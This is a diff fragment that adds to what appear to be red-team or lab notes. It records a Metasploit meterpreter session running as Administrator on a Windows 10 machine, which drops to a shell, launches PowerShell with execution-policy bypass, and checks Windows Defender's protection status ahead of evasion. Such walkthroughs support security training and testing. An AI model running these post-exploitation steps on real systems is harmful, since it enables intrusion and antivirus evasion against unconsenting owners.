@@ -765,7 +765,29 @@ msf6 exploit(multi/handler) > sessions -i 2
 
 meterpreter > getuid
 Server username: Laptopwin10\Administrator
-meterpreter > 
+
+meterpreter > shell
+
+Process 11948 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.PO718687\Documents\Tools-AD>powershell -exec bypass
+powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> 
+
 <SNIP>
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
